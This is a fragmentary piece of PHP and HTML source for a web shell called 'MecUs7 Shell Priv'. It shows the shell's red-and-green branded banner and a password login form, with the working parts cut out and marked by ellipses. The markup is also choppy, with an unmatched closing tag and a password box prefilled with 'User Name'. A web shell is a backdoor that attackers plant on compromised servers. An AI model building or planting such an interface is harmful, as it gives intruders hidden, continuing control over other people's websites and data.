...
?>
<div align="center">
<a href="<?php $_SERVER['PHP_SELF'];?>"><font size="6" color="#FF0000" style="text-decoration:none;" face="Times New Roman, Times, serif">MecUs7 Shell Priv</font></a>
...
<hr color="#1B1B1B">
<div align="center">
<font size="6" face="Times New Roman, Times, serif" color="#00CC00"><br>Powered by MecUs7</font><br><font color="#FF0000" size="6"></font></a></div>
<?php 
}	
}
...
?>
	...
	<div style="background-color:#171717; width:50%; border-radius:7px; margin-top:150px; -moz-border-radius:25px; height:410px; background-image:url(Windows_7_-_Alien_from_outer_space.jpg);">
		<table cellpadding="9" cellspacing="4">
			<tr>
				<td align="center" colspan="2"><blink><font size="6"><b><br>MecUs7 Shell Priv</br></b></font></blink></td>
			</tr>
			<tr>
			...
			<tr>
				...
				<td><input type="password" name="passwd" style="background-color:#333333; border-radius:7px; -moz-border-radius:10px; border-color:#000000; width:170px; color:#666666;"  value="User Name" onFocus="if (this.value == 'User Name'){this.value=''; this.style.color='black';}" onBlur="if (this.value == '') {this.value='User Name'; this.style.color='#383838';}" AUTOCOMPLETE="OFF"></td>
			</tr>
			<tr>
				<td align="center" colspan="2"><input type="submit" class="but" value="     Login     "></td>
			</tr>
			<tr>
				<td align="center" colspan="2"><font size="6" face="Times New Roman, Times, serif"><b>Powered by MecUs7</b></font></td>
			</tr>
			<tr>
